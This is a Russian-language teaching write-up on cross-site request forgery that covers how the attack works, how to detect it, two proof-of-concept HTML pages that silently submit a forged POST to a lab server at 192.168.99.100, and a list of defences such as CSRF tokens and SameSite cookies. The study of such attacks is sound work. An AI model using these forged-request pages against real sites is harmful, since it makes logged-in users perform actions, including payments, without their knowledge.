# CSRF атака

## Описание

CSRF - это атака при которой хакер выполняет массу различных действий от имени других, зарегистрированных посетителей. Для управления сессией пользователя  многие веб-приложения используют куки (здесь и далее считаем уместным называть cookies по-русски). Браузер устроен так, что, если у него есть куки пользователя для данного домена и пути, он их автоматически отправляет вместе с HTTP-запросом.

Атаки по подделке межсайтовых запросов (CSRF) происходит в два этапа:
1) Необходимо заставить "жертву" щелкнуть по ссылке или загрузить страницу злоумышленника. Эта ссылка запускает поддельный запрос, содержащий вредоносный код. Вредоносный код обычно размещается на веб-сайте принадлежащим злоумышленнику, в другом домене.
  

2) Необходимо отправить специально созданный запрос в браузер "жертвы", который отправит законный запрос в веб-приложение (JavaScript вызывает form.submit, отправляя таким образом форму на mail.com). Запрос будет отправлен с использованием учетных данных HTTP или файлов cookie со значениями, которые хочет злоумышленник. Он будет считаться законным, даже если "жертва" будет отправлять запрос по команде злоумышленника.


## Классификация
*CSRF-атака с использованием запроса GET*

GET-запросы не должны использоваться для выполнения изменений состояния, поэтому отправка GET-запроса не изменяет никаких данных.

При щелчке вредоносной ссылки злоумышленник перенаправляет "жертву" в свое вредоносное веб-приложение, который выполняет сценарий, заставляющий браузер "жертвы" отправить незаконный (пользователь не знает о том, что он отправляется) запрос, включающий в себя необходимые файлы cookie. 


*CSRF-атаки с использованием запросов POST*

Большинство запросов на изменение состояния будут выполняться через запросы POST, отправляющие любые параметры и значения в теле запроса. 

Для запросов POST требуется, чтобы тело запроса было добавлено к самому запросу. Используя немного JavaScript, злоумышленник может заманить "жертву" в свое вредоносное веб-приложение, чтобы при загрузке веб-страницы незаконный запрос POST отправлялся автоматически.
При загрузке страницы, заготовленная функция обеспечивает отправку формы, которая в свою очередь отправляет запрос POST. В форму включены статические параметры, где, например, example.com идентифицирует запрос как законный, поскольку он будет включать файлы cookie "жертвы".


## Условия
- ОС: любая
- язык: любой
- компоненты: не имеют значения
- настройки: обязательно должны использоваться cookies

## Детектирование
Проблема детектируется в ручную. 
Необходимо проверить:
1) передачу cookies
2) наличие CSRF токена
3) заголовок Referer (наличие и адрес прихода запроса)

## Эксплуатация

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок.PNG)

На рисунке 1 показаны оригинальная страница и видоизмененный запрос, изменяющий параметр №1 с true на false.

---

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок1.PNG)

На рисунке 2 показан результат перехода по видоизмененной ссылке, показанной на рисунке 1. Как видно на рисунке 2 – пользователем, в браузере которого были сохранены cookie и, следовательно, он был залогинен на данном сайте, был отправлен запрос против его воли. 

---

![Иллюстрация к проекту](https://github.com/kythip/shift2019/blob/master/csrf/Снимок2.PNG)

На рисунке 3 показан состав пакета, с помощью которого составили вредоносную ссылку. Во второй строке показан изначальный хост - адрес сервера, с которого и с которым проводятся манипуляции. В первой строке указан метод, команда и изменяемая переменная.

---
  ``` <!DOCTYPE html> 
  <html lang="en"> 
  <head> 
    <meta charset="UTF-8"> 
    <title>CSRF</title> 
  </head> 
  <body> 
 
  <br> 
  <p> 
    <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
      <p><input type=hidden value="false" name=settings> 
  </form> 
  </p> 
    <script type="text/javascript"> 
    document.csrf_try.submit(); 
  </script>  
  </body> 
  </html>
  ```
  Данный код представляет HTML страницу на который присутсвует вредоносный код. В form указывается имя формы, метод и "действие", в данном случае переход на страницу изменения параметра. В строке input указывается атрибут hidden, который скрывает от пользователя изменения параметра на false. После формы создается javascript, который позволяет выполнить автовыполнение формы при открытии страницы.
  Теперь, если залогиненный пользователь на ресурсе 192.168.99.100, перейдет на данную страницу, то у него изменится параметр settings 2 на false.
  
 ---

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XHR_CSRF</title>
</head>
<body>

	<script	type="text/javascript">
var xhr=new XMLHttpRequest ();
xhr.open("POST", "http://192.168.99.100:1337/change_settings_2", true);
xhr.setRequestHeader("Accept", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8");
xhr.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
 
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials=true;
var params='settings=false';
xhr.send(params);
	</script>
</body>
</html>
```
Данная эксплуатация CSRF-уязвимости позволяет заставить пользователя совершить какие-либо действия без его ведома, так как с использованием XHttpRequest возможно совершение действия без перехода на атакуемую страницу. 


## Ущерб
Злоумышленник имеет возможность совершать действия, о который пользователь не знает совсем. Например, можно подписаться на какую-либо страницу, отправить сообщение, поставить лайк или даже отправить деньги (если не предусмотрено подтверждение паролем).  

## Защита
### Основные меры

1) CSRF токен 
* генерируется рандомный токен, который привязывается к сессии; 
* токен подставляется в форму и сверяется при приеме запроса; 
* атакующий не знает токена, следовательно не сможет заставить пользователя отправить запрос.

2) Double Submit Cookie 
* передавать токен клиенту двумя методами: в куках и в одном из параметров ответа (header или внутри HTML); 
* в последующих запросах предоставляются оба полученных ранее токена (как cookie и как header, либо внутри POST данных формы);
* сервер обязан проверить на идентичность токен из cookie и токен, который явно прислал клиент (если оба токена совпадают, то запрос не подвергся CSRF-Атаке, в ином случае — логируем событие и отклоняем запрос).

3) SameSite Cookies (Chrome, Opera)
* cookie не нужно передавать, если запрос идет с сайта, отличного от того, на котором cookie была установлена (защита ресурса от CSRF без использования дополнительных инструментов);
* Chrome уже сейчас поддерживает эту возможность.

4) Content-Type based protection
* пользователь должен отправить запрос с определенным заголовком Content-Type, например, application/json; 
(не лучшая защита).

5) Referer-based protection
* пользователь должен отправить запрос с определенным значением заголовка Referer; 
* бэкенд его проверяет, если он неверный, то считается, что это CSRF-атака;
(не лучшая защита).

6) Password confirmation / websudo
* пользователь должен подтверждать действие с помощью пароля (или секрета);
(атакующий его не знает, поэтому классическая CSRF-атака не работает).


## Дополнительно
Здесь приложить дополнительную информацию и источники, которые использовали, но не указали выше в других местах.

## Обход защиты
1) Referer может быть скрыт.
